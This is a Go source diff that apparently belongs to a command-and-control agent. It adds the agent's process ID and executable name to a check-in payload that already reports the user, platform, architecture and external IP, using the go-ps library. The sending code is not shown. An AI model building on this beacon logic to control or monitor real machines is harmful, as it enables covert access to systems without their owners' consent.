@@ -4,11 +4,13 @@ import (
 	"os"
 	"fmt"
 	"time"
+	"strconv"
 	"context"
 	"runtime"
 	"os/user"
 	"net/http"
 	"encoding/json"
+	ps "github.com/mitchellh/go-ps"
 	"github.com/thecodeteam/goodbye"
 )
 
@@ -31,6 +33,8 @@ var cmdPort string
 var cmdHost string
 var id string
 var ip string
+var pid string
+var pname string
 var queryData string
 var debug bool = false
 var curUser string
@@ -49,13 +53,17 @@ func main() {
 	curUser = user.Username
 	platform = runtime.GOOS
 	arch = runtime.GOARCH
+	pid = strconv.Itoa(os.Getpid())
+	p, e := ps.FindProcess(os.Getpid())
 
 	fmt.Println(id + " " + platform + "/" + arch)
+	fmt.Println(pid + " : " + p.Executable())
+	fmt.Println(e)
 	
 	lhost, err := externalIP()
 	debugFatal(err)
 	ip = lhost
-	jsonData, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"",nil})
+	jsonData, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,p.Executable(),"",nil})
 	debugFatal(err)
 	
 	var encoder = Base64Encoder {
